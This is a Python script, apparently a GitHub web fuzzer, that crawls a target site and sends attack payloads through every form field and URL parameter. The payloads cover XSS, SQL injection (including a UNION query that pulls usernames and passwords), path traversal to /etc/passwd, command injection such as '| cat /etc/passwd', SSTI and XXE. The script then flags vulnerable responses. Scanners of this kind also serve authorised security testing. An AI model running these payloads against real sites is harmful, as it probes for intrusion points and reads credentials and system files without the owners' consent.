#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re
from concurrent.futures import ThreadPoolExecutor
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Enhanced payloads with descriptions
PAYLOADS = {
    "XSS": [
        ('<script>alert(1)</script>', "Basic XSS"),
        ('"><script>alert(1)</script>', "Breakout XSS"),
        ('javascript:alert(1)', "JavaScript URI XSS"),
        ('" onmouseover=alert(1)', "Event Handler XSS")
    ],
    "SQLi": [
        ("' OR '1'='1", "Basic SQLi"),
        ("' OR 1=1-- -", "SQL Comment SQLi"),
        ("1' ORDER BY 1-- -", "Order By SQLi"),
        ("1' UNION SELECT null,username,password FROM users-- -", "Union SQLi")
    ],
    "LFI": [
        ("../../../../etc/passwd", "Basic LFI"),
        ("....//....//....//....//etc/passwd", "Path Traversal LFI"),
        ("/proc/self/environ", "Proc LFI"),
        ("file:///etc/passwd", "File URI LFI")
    ],
    "CMDi": [
        ("; whoami", "Basic Command Injection"),
        ("&& id", "AND Command Injection"),
        ("| cat /etc/passwd", "Pipe Command Injection"),
        ("`uname -a`", "Backtick Command Injection")
    ],
    "SSTI": [
        ("{{7*7}}", "Basic SSTI"),
        ("${7*7}", "Dollar SSTI"),
        ("<%= 7*7 %>", "ERB SSTI"),
        ("${{7*7}}", "Twig SSTI")
    ],
    "XXE": [
        ("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>", "Basic XXE"),
        ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "XML XXE")
    ]
}

HEADERS = {
    'User-Agent': 'Mozilla/5.0 AdvancedWebFuzzBot/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive'
}

# Color shortcuts
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
BR = Style.BRIGHT
RS = Style.RESET_ALL

def print_banner():
    print(f"""
{BR}{M}
  ██╗    ██╗███████╗██████╗     ███████╗██╗   ██╗███████╗███████╗██████╗ {R}██████╗  ██████╗ 
  ██║    ██║██╔════╝██╔══██╗    ██╔════╝██║   ██║╚══███╔╝╚══███╔╝██╔══██╗{R}╚════██╗██╔═████╗
  ██║ █╗ ██║█████╗  ██████╔╝    █████╗  ██║   ██║  ███╔╝   ███╔╝ ██████╔╝{R} █████╔╝██║██╔██║
  ██║███╗██║██╔══╝  ██╔══██╗    ██╔══╝  ██║   ██║ ███╔╝   ███╔╝  ██╔══██╗{R} ╚═══██╗████╔╝██║
  ╚███╔███╔╝███████╗██████╔╝    ██║     ╚██████╔╝███████╗███████╗██████╔╝{R}██████╔╝╚██████╔╝
   ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═════╝ {R}╚═════╝  ╚═════╝ 
{BR}{C}  ╔═╗╔═╗╔╦╗╦ ╦╔═╗╦═╗╔═╗╔═╗╦ ╦╔═╗╦═╗╔╦╗
  ╚═╗║╣  ║ ╠═╣║ ║╠╦╝╠═╣║  ╚═╗╠═╣╠═╝╠╦╝ ║ 
  ╚═╝╚═╝ ╩ ╩ ╩╚═╝╩╚═╩ ╩╚═╝╚═╝╩ ╩╩  ╩╚═ ╩ 
{BR}{'-'*80}{RS}
{BR}{Y}  ➤ A Next-Gen Web Fuzzer & Vulnerability Scanner{R}
{BR}{Y}  ➤ GitHub: {C}https://github.com/adityadash2003/WEB_FUZZER_YO{R}
{BR}{Y}  ➤ Author: {C}Aditya Dash{R}
{BR}{'-'*80}{RS}
""")

def print_status(message, level="info"):
    """Print colored status messages"""
    if level == "info":
        print(f"{BR}{B}[*]{RS} {message}")
    elif level == "success":
        print(f"{BR}{G}[+]{RS} {message}")
    elif level == "warning":
        print(f"{BR}{Y}[!]{RS} {message}")
    elif level == "error":
        print(f"{BR}{R}[-]{RS} {message}")
    elif level == "critical":
        print(f"{BR}{R}[!!!]{RS} {message}")

def is_valid_url(url):
    """Check if URL is valid"""
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def get_all_links(url, domain):
    """Extract all links from a page that belong to the same domain"""
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        links = set()
        for a_tag in soup.find_all("a", href=True):
            href = a_tag["href"]
            absolute_url = urljoin(url, href)
            
            if is_valid_url(absolute_url) and domain in absolute_url:
                links.add(absolute_url)
        
        return links
    except Exception as e:
        print_status(f"Error getting links from {url}: {str(e)}", "error")
        return set()

def crawl_site(start_url, max_pages=50):
    """Crawl the website to find all pages"""
    domain = urlparse(start_url).netloc
    visited = set()
    to_visit = {start_url}
    all_links = set()

    print_status(f"Starting crawl of {domain} (max {max_pages} pages)...", "info")

    while to_visit and len(visited) < max_pages:
        current_url = to_visit.pop()
        
        if current_url in visited:
            continue
            
        try:
            print_status(f"Crawling: {current_url}", "info")
            visited.add(current_url)
            
            new_links = get_all_links(current_url, domain)
            all_links.update(new_links)
            
            to_visit.update(new_links - visited)
            
        except Exception as e:
            print_status(f"Error crawling {current_url}: {str(e)}", "error")
    
    print_status(f"Crawling completed. Found {len(all_links)} unique pages.", "success")
    return all_links

def extract_forms(url):
    """Extract all forms from a page"""
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all("form")
    except Exception as e:
        print_status(f"Error extracting forms from {url}: {str(e)}", "error")
        return []

def get_form_details(form, base_url):
    """Extract details from a form"""
    action = form.attrs.get("action", "").strip()
    method = form.attrs.get("method", "get").lower()
    form_url = urljoin(base_url, action)

    inputs = []
    for input_tag in form.find_all(["input", "textarea", "select"]):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        value = input_tag.attrs.get("value", "")
        
        if name:
            inputs.append({
                "type": input_type,
                "name": name,
                "value": value
            })

    return {
        "action": form_url,
        "method": method,
        "inputs": inputs
    }

def extract_url_params(url):
    """Extract parameters from URL query string"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    param_list = []
    for name, values in params.items():
        for value in values:
            param_list.append({
                "name": name,
                "value": value,
                "type": "url"
            })
    
    return param_list

def submit_form(form_details, payload, base_url):
    """Submit a form with a payload"""
    target_url = form_details["action"]
    data = {}

    for input_field in form_details["inputs"]:
        if input_field["type"] != "submit":
            data[input_field["name"]] = payload
        else:
            data[input_field["name"]] = input_field["value"]

    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, headers=HEADERS, timeout=10)
        else:
            response = requests.get(target_url, params=data, headers=HEADERS, timeout=10)

        return response
    except Exception as e:
        print_status(f"Error submitting form: {str(e)}", "error")
        return None

def test_url_params(url, payload):
    """Test URL parameters with a payload"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    for param in params:
        params[param] = payload
    
    query = "&".join(f"{k}={v}" for k, v in params.items())
    malicious_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
    
    try:
        response = requests.get(malicious_url, headers=HEADERS, timeout=10)
        return response
    except Exception as e:
        print_status(f"Error testing URL parameters: {str(e)}", "error")
        return None

def analyze_response(response, payload_type, payload):
    """Analyze response for signs of vulnerabilities"""
    if not response:
        return []
    
    text = response.text.lower()
    headers = str(response.headers).lower()
    status = response.status_code
    
    indicators = {
        "XSS": [
            "<script>alert(1)</script>",
            "onmouseover=alert(1)",
            "javascript:alert(1)"
        ],
        "SQLi": [
            "sql syntax",
            "mysql error",
            "you have an error",
            "unclosed quotation mark",
            "warning: mysql"
        ],
        "LFI": [
            "root:x:0:0:",
            "/bin/bash",
            "etc/passwd",
            "proc/self/environ"
        ],
        "CMDi": [
            "uid=",
            "gid=",
            "groups=",
            "linux",
            "uname"
        ],
        "SSTI": [
            "49",
            "=49",
            "twig",
            "jinja2",
            "template error"
        ],
        "XXE": [
            "root:x:0:0:",
            "etc/passwd",
            "xml parsing error"
        ]
    }
    
    found = []
    
    if payload.lower() in text:
        found.append(f"Reflected {payload_type}")
    
    for vuln, patterns in indicators.items():
        for pattern in patterns:
            if pattern.lower() in text or pattern.lower() in headers:
                found.append(vuln)
                break
    
    if status == 500 and "Internal Server Error" in text:
        found.append("Possible Server Error")
    elif status == 200 and len(text) == 0:
        found.append("Empty 200 Response")
    
    return found

def test_vulnerabilities(url, form_details=None, param_details=None):
    """Test for vulnerabilities in a form or URL parameter"""
    vulnerabilities = []
    
    if form_details:
        for vuln_type, payloads in PAYLOADS.items():
            for payload, description in payloads:
                response = submit_form(form_details, payload, url)
                if response:
                    issues = analyze_response(response, vuln_type, payload)
                    for issue in issues:
                        vulnerabilities.append({
                            "type": issue,
                            "payload": payload,
                            "description": description,
                            "location": f"Form input: {form_details['action']}",
                            "field": ", ".join(inp['name'] for inp in form_details['inputs']),
                            "response_code": response.status_code
                        })
    
    if param_details:
        for vuln_type, payloads in PAYLOADS.items():
            for payload, description in payloads:
                response = test_url_params(url, payload)
                if response:
                    issues = analyze_response(response, vuln_type, payload)
                    for issue in issues:
                        vulnerabilities.append({
                            "type": issue,
                            "payload": payload,
                            "description": description,
                            "location": f"URL parameter: {url}",
                            "field": param_details['name'],
                            "response_code": response.status_code
                        })
    
    return vulnerabilities

def scan_site(url, crawl=False, max_threads=5):
    """Scan a website for vulnerabilities"""
    print_status(f"Starting scan of {url}", "info")
    
    if crawl:
        urls_to_scan = crawl_site(url)
        urls_to_scan.add(url)
    else:
        urls_to_scan = {url}
    
    all_vulnerabilities = []
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        
        for page_url in urls_to_scan:
            futures.append(executor.submit(scan_page, page_url))
        
        for future in futures:
            result = future.result()
            if result:
                all_vulnerabilities.extend(result)
    
    return all_vulnerabilities

def scan_page(url):
    """Scan a single page for vulnerabilities"""
    page_vulnerabilities = []
    
    params = extract_url_params(url)
    for param in params:
        vulns = test_vulnerabilities(url, param_details=param)
        if vulns:
            page_vulnerabilities.extend(vulns)
    
    forms = extract_forms(url)
    for form in forms:
        form_details = get_form_details(form, url)
        vulns = test_vulnerabilities(url, form_details=form_details)
        if vulns:
            page_vulnerabilities.extend(vulns)
    
    return page_vulnerabilities

def print_report(vulnerabilities):
    """Print a formatted vulnerability report"""
    if not vulnerabilities:
        print_status("No vulnerabilities found!", "success")
        return
    
    print(f"\n{BR}{R}=== VULNERABILITY REPORT ==={RS}\n")
    
    grouped = {}
    for vuln in vulnerabilities:
        if vuln['type'] not in grouped:
            grouped[vuln['type']] = []
        grouped[vuln['type']].append(vuln)
    
    for vuln_type, vulns in grouped.items():
        print(f"{BR}{R}■ {vuln_type.upper()} ({len(vulns)} found){RS}")
        
        for i, vuln in enumerate(vulns, 1):
            print(f"\n{B}{i}. {vuln['description']}{RS}")
            print(f"{Y}Payload:{RS} {vuln['payload']}")
            print(f"{Y}Location:{RS} {vuln['location']}")
            print(f"{Y}Field:{RS} {vuln['field']}")
            print(f"{Y}Response Code:{RS} {vuln['response_code']}")
        
        print("\n" + "-"*80 + "\n")

def main():
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-c', '--crawl', action='store_true', help='Crawl the entire website')
    parser.add_argument('-t', '--threads', type=int, default=5, 
                       help='Number of threads to use (default: 5)')
    
    args = parser.parse_args()
    
    if not is_valid_url(args.url):
        print_status("Invalid URL. Please include http:// or https://", "error")
        return
    
    print_banner()
    
    try:
        vulnerabilities = scan_site(args.url, crawl=args.crawl, max_threads=args.threads)
        print_report(vulnerabilities)
    except KeyboardInterrupt:
        print_status("\nScan interrupted by user", "error")
    except Exception as e:
        print_status(f"An error occurred: {str(e)}", "critical")

if __name__ == "__main__":
    main()
